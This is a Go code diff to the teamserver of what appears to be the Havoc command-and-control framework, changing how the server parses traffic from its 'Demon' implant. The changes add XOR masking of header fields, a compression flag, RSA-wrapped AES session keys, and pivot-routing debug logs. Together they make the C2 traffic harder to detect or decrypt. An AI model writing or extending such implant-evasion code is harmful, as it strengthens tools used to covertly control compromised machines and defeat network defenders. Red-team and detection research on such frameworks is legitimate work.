@@ -191,6 +191,24 @@ func ParseHeader(data []byte) (Header, error) {
 		return Header, errors.New("failed to parse package size")
 	}
 
+	// [HVC-003 2026-03-26] Reverse the XOR mask applied by the Demon to outer
+	// header fields (bytes 4-19: magic, agent ID, command ID, request ID).
+	// The Demon derives the mask as SIZE ^ HEADER_MASK_SEED; we reconstruct it
+	// from the SIZE we just parsed and apply the same XOR to undo it.
+	// See TrafficImprovements.md §3.
+	//
+	// [HVC-007 2026-03-28] The Demon sets bit 31 of the wire SIZE field to
+	// signal LZNT1 compression, and then applies HVC-003 masking to the
+	// following 16 bytes using the full SIZE value (bit 31 included) as the
+	// mask base.  We must therefore compute the XOR mask from the raw SIZE
+	// (before stripping bit 31) to match what the Demon computed.
+	Parser.XorMaskNextBytes(Header.Size^HeaderMaskSeed, 16)
+
+	// Now safe to extract the compression flag and strip bit 31.
+	// See TrafficImprovements.md §7.
+	Header.Compressed = (Header.Size & 0x80000000) != 0
+	Header.Size &= 0x7FFFFFFF
+
 	if Parser.Length() > 4 {
 		Header.MagicValue = Parser.ParseInt32()
 	} else {
@@ -324,7 +342,13 @@ func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
 	return agent
 }
 
-func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string) *Agent {
+// ParseDemonRegisterRequest parses the Demon registration packet.
+//
+// [HVC-005 2026-03-28] The rsaDecrypt parameter must be non-nil; it is called
+// with the 256-byte RSA-OAEP-SHA256 ciphertext that wraps the agent's 48-byte
+// AES session key material (32-byte key + 16-byte IV).  The recovered key
+// material is used to decrypt the remainder of the registration body.
+func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string, rsaDecrypt func([]byte) ([]byte, error)) *Agent {
 	//logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))
 
 	var (
@@ -347,19 +371,17 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 		SleepJitter  int
 		KillDate     int64
 		WorkingHours int32
-		AesKeyEmpty  = make([]byte, 32)
 	)
 
 	/*
-		[ SIZE         ] 4 bytes
-		[ Magic Value  ] 4 bytes
-		[ Agent ID     ] 4 bytes
-		[ COMMAND ID   ] 4 bytes
-		[ Request ID   ] 4 bytes
-		[ AES KEY      ] 32 bytes
-		[ AES IV       ] 16 bytes
+		[ SIZE          ] 4 bytes
+		[ Magic Value   ] 4 bytes
+		[ Agent ID      ] 4 bytes
+		[ COMMAND ID    ] 4 bytes
+		[ Request ID    ] 4 bytes
+		[ RSA CIPHERTEXT] 256 bytes  -- [HVC-005] wraps 32-byte AES key + 16-byte IV
 		AES Encrypted {
-			[ Agent ID     ] 4 bytes <-- this is needed to check if we successfully decrypted the data
+			[ Agent ID     ] 4 bytes <-- used to verify decryption succeeded
 			[ Host Name    ] size + bytes
 			[ User Name    ] size + bytes
 			[ Domain       ] size + bytes
@@ -376,15 +398,27 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 		}
 	*/
 
-	if Parser.Length() >= 32+16 {
+	// [HVC-005] Read 256-byte RSA ciphertext and recover the 48-byte key material.
+	const rsaCiphertextLen = 256
+	if Parser.Length() >= rsaCiphertextLen {
+		rsaCiphertext := Parser.ParseAtLeastBytes(rsaCiphertextLen)
+
+		keyMaterial, err := rsaDecrypt(rsaCiphertext)
+		if err != nil || len(keyMaterial) < 48 {
+			logger.Error("HVC-005: RSA key unwrap failed: " + func() string {
+				if err != nil { return err.Error() }
+				return "short key material"
+			}())
+			return nil
+		}
 
 		var Session = &Agent{
 			Encryption: struct {
 				AESKey []byte
 				AESIv  []byte
 			}{
-				AESKey: Parser.ParseAtLeastBytes(32),
-				AESIv:  Parser.ParseAtLeastBytes(16),
+				AESKey: keyMaterial[0:32],
+				AESIv:  keyMaterial[32:48],
 			},
 
 			Active:     false,
@@ -393,10 +427,7 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 			Info: new(AgentInfo),
 		}
 
-		// check if there is aes key/iv.
-		if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
-			Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
-		}
+		Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
 
 		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
 			DemonID = Parser.ParseInt32()
@@ -648,10 +679,13 @@ func (a *Agent) AddJobToQueue(job Job) []Job {
 	a.AddRequest(job)
 	// if it's a pivot agent then add the job to the parent
 	if a.Pivots.Parent != nil {
-		//logger.Debug("Prepare command for pivot demon: " + a.NameID)
+		logger.Debug(fmt.Sprintf("AddJobToQueue: pivot agent %s — routing Command=0x%x through parent %s",
+			a.NameID, job.Command, a.Pivots.Parent.NameID))
 		a.PivotAddJob(job)
 		// if it's a direct agent add the job to the direct agent
 	} else {
+		logger.Debug(fmt.Sprintf("AddJobToQueue: direct agent %s — queuing Command=0x%x (queue_len=%d→%d)",
+			a.NameID, job.Command, len(a.JobQueue), len(a.JobQueue)+1))
 		a.JobQueue = append(a.JobQueue, job)
 	}
 	return a.JobQueue
@@ -759,6 +793,9 @@ func (a *Agent) PivotAddJob(job Job) {
 		return
 	}
 
+	logger.Debug(fmt.Sprintf("PivotAddJob: building COMMAND_PIVOT wrapper for pivot %s (AgentID=%08x), payload=%d bytes",
+		a.NameID, AgentID, len(Payload)))
+
 	Packer.AddInt32(int32(AgentID))
 	Packer.AddBytes(Payload)
 
@@ -809,6 +846,8 @@ func (a *Agent) PivotAddJob(job Job) {
 		pivots = &pivots.Parent.Pivots
 	}
 
+	logger.Debug(fmt.Sprintf("PivotAddJob: queuing COMMAND_PIVOT job on parent %s (queue_len=%d→%d)",
+		pivots.Parent.NameID, len(pivots.Parent.JobQueue), len(pivots.Parent.JobQueue)+1))
 	pivots.Parent.JobQueue = append(pivots.Parent.JobQueue, PivotJob)
 }
 
